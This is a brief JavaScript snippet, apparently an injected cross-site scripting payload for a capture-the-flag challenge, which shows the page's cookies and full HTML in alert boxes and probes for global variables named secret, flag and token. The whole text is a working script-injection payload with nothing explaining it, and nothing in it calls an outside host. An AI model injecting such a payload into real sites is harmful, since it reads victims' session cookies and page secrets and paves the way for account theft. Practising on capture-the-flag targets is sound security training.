// Dump everything possible
alert(document.cookie);
alert(document.body.innerHTML); // smaller than full outerHTML
alert(document.documentElement.outerHTML); // full page if needed

// Try common flag variables
try {
  alert(secret);
} catch (e) {}
try {
  alert(flag);
} catch (e) {}
try {
  alert(token);
} catch (e) {}
try {
  alert(flagValue);
} catch (e) {}

// Dump all window keys (array popup - scan for clues)
console.log(Object.keys(window).join(","));
